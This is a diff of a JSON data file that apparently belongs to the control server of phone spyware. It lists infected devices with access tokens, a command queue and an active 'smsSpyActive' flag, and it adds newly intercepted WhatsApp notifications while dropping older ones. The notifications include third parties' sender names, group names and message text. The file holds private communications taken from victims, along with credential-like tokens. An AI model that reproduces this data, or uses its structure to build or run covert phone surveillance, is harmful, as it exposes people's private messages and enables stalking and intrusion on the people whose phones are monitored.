@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044266346,
+    "lastSeen": 1775044272262,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13091 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 19:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044272803
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15356 pesan dari 10 chat",
+        "time": "01/04 19:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044268043
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13090 pesan): ~ ipaa୨୧|| `𝟔𝟐𝟔",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "01/04 19:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044267925
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎7Sex Message (3 pesan): ~ Call Me Zal7Sex",
@@ -3995,30 +4019,6 @@
         "time": "01/04 19:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043749598
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12934 pesan): ~ sʏʀɪɴɴ",
-        "content": "Gadis kayu",
-        "time": "01/04 19:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043749577
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15210 pesan dari 10 chat",
-        "time": "01/04 19:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043748937
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12933 pesan): ~ Bot",
-        "content": "✅ Jawaban Benar! \nJawabannya adalah: gadis ayu\n\nSelamat kepada @⁨~🕷️⁩! 🎉\n🎁 Kamu mendapatkan hadiah +4 Limit Bot!",
-        "time": "01/04 19:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043748923
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775044267783,
+    "lastSeen": 1775044270935,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15356 pesan dari 10 chat",
+        "time": "01/04 19:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044268011
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13090 pesan): ~ ipaa୨୧|| `𝟔𝟐𝟔",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043749588
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15210 pesan dari 10 chat",
-        "time": "01/04 19:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043748951
       }
     ],
     "galleryPhotos": [],
